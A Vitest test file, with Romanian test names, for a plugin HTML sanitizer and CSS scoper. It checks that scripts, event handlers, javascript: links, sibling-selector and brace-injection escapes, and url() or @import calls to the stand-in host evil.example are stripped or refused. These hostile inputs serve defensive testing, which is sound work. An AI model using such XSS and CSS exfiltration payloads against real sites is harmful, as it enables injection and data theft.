import { describe, expect, test } from "vitest";
import { scopePluginCss } from "./css";
import { sanitizePluginHtml } from "./sanitize";

const icon = (name: string) => (name === "fa-solid fa-star" ? '<svg class="gcs-icon"><path d="M0"/></svg>' : null);

describe("HTML-ul pluginurilor", () => {
  test("scripturile, handlerele și stilurile dispar", () => {
    const html = sanitizePluginHtml(
      `<p onclick="x()" style="position:fixed" id="main" name="x">Salut</p><script>alert(1)</script><img src="javascript:alert(1)" onerror="x"><iframe src="https://e"></iframe><form action="/x"><input name="a"><button>Go</button></form><svg><script>1</script></svg><!-- c -->`,
    );
    expect(html).toBe("<p>Salut</p><img loading=\"lazy\" />Go");
  });

  test("linkurile primesc rel, iar schemele periculoase dispar", () => {
    expect(sanitizePluginHtml('<a href="https://x.example" target="_self">x</a>')).toBe('<a href="https://x.example" target="_blank" rel="noopener noreferrer nofollow ugc">x</a>');
    expect(sanitizePluginHtml('<a href="javascript:alert(1)">x</a>')).toBe('<a rel="noopener noreferrer nofollow ugc">x</a>');
    expect(sanitizePluginHtml('<a href="//evil.example/x">x</a>')).toBe('<a rel="noopener noreferrer nofollow ugc">x</a>');
    expect(sanitizePluginHtml('<a href="/p/acme.demo/stats">x</a>')).toContain('href="/p/acme.demo/stats"');
    expect(sanitizePluginHtml('<img src="http://x.example/a.png">')).toBe('<img loading="lazy" />');
    expect(sanitizePluginHtml('<img src="data:image/png;base64,AAAA">')).toBe('<img loading="lazy" />');
  });

  test("clasele: doar gcsp-* și clasele GCS de prezentare", () => {
    expect(sanitizePluginHtml('<div class="gcsp-box gcs-muted gcs-drawer gcs-modal evil">x</div>')).toBe('<div class="gcsp-box gcs-muted">x</div>');
    expect(sanitizePluginHtml('<span data-gcsp-id="1" data-testid="gcs-header-user" aria-label="x" role="note">x</span>')).toBe('<span data-gcsp-id="1" aria-label="x" role="note">x</span>');
  });

  test("<gcs-icon> devine iconița Font Awesome; numele necunoscute dispar", () => {
    expect(sanitizePluginHtml('<p><gcs-icon name="fa-solid fa-star"></gcs-icon> Top</p>', { icon })).toBe('<p><svg class="gcs-icon"><path d="M0"/></svg> Top</p>');
    expect(sanitizePluginHtml('<gcs-icon name="fa-solid fa-star" />!', { icon })).toBe('<svg class="gcs-icon"><path d="M0"/></svg>!');
    expect(sanitizePluginHtml('<gcs-icon name="fa-solid fa-nope"></gcs-icon><gcs-icon name="x&quot; onload=&quot;1"></gcs-icon>', { icon })).toBe("");
  });
});

describe("CSS-ul pluginurilor", () => {
  const scope = (css: string, file = "assets/style.css") => scopePluginCss(css, { pluginKey: "acme.demo", file });

  test("se închide în clasa pluginului, iar url()-urile relative se rescriu", () => {
    expect(scope(".box { color: red; background: url(img/bg.png) } @media (max-width: 600px) { .box { color: blue } }")).toEqual({
      ok: true,
      css: '.gcsp--acme--demo {\n.box { color: red; background: url("/plugins/acme.demo/assets/img/bg.png") } @media (max-width: 600px) { .box { color: blue } }\n}\n',
    });
    expect(scope("a{background:url('data:image/png;base64,AAAA')}")).toMatchObject({ ok: true });
  });

  test("exfiltrarea și ieșirea din container sunt refuzate", () => {
    const cases: [string, string][] = [
      ["@import url(https://evil.example/x.css);", "css_forbidden"],
      ["a { background: url(https://evil.example/?k=1) }", "css_url"],
      ["a { background: url(//evil.example/x) }", "css_url"],
      ["a { background: url(../../../admin) }", "css_url"],
      ["} body { display: none } a {", "css_braces"],
      ["a { color: red }}", "css_braces"],
      ["a { color: red", "css_braces"],
      ["& ~ .gcs-siteHeader { display: none }", "css_selector"],
      ["body:has(&) .gcs-siteHeader { display: none }", "css_selector"],
      ["+ .gcs-siteMain { display: none }", "css_selector"],
      ["a, ~ b { color: red }", "css_selector"],
      ["@scope (body) { a { color: red } }", "css_unsupported"],
      ["@font-face { font-family: x; src: url(f.woff2) }", "css_unsupported"],
      ["a { background: url(x.png) } /* </style><script> */", "css_forbidden"],
      ["a { content: '\\3c script' }", "css_forbidden"],
      ["a { width: expression(alert(1)) }", "css_forbidden"],
    ];
    for (const [css, code] of cases) expect([css, scope(css)]).toEqual([css, expect.objectContaining({ ok: false, code })]);
  });

  test("CR, FF și celelalte caractere de control nu pot închide containerul", () => {
    // Browserul transformă CR/FF în LF înainte de parsare: șirul se termină acolo, iar `}` de după e o acoladă reală.
    for (const ctl of ["\f", "\r", "\r\n"]) {
      const css = `.x { content: "${ctl}} } body { display: none } .y { content: "; }`;
      expect([JSON.stringify(ctl), scope(css)]).toEqual([JSON.stringify(ctl), expect.objectContaining({ ok: false })]);
    }
    for (const ctl of ["\u0000", "\u0001", "\u000b", "\u001b", "\u007f"]) {
      expect([JSON.stringify(ctl), scope(`a { color: red${ctl} }`)]).toEqual([JSON.stringify(ctl), { ok: false, code: "css_forbidden", detail: "control" }]);
    }
    // Sfârșiturile de rând Windows și tab-urile rămân valide (normalizate la LF).
    expect(scope("a {\r\n\tcolor: red;\r\n}\r\n")).toEqual({ ok: true, css: ".gcsp--acme--demo {\na {\n\tcolor: red;\n}\n}\n" });
    expect(scope("a {\fcolor: red }")).toEqual({ ok: true, css: ".gcsp--acme--demo {\na {\ncolor: red }\n}\n" });
  });

  test("acoladele din șiruri și comentarii nu contează", () => {
    expect(scope('a::after { content: "}" } /* { */ b { color: red }')).toMatchObject({ ok: true });
  });
});
